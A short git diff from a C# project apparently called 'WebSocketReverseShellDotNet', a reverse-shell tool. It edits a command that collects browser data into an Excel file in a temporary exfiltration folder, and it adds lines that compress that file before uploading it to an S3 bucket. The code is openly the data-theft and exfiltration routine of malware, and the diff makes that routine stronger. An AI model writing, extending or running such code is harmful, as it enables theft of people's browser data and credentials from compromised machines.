@@ -64,6 +64,11 @@ namespace WebSocketReverseShellDotNet.service.commands
                 addAllDataToHashMap();
                 string path = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}\\browser.xlsx";
                 FileInfo file = Excel.ConvertToExcel(browserData, path);
+                List<string> files = new List<string>();
+                files.Add(path);
+
+                file = OSUtil.ZipFiles(files, $"{ OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}","browser.zip");
+
                 stringBuilder.AppendLine(S3Uploadutil.UploadToS3(file));
 
                 return stringBuilder.ToString();
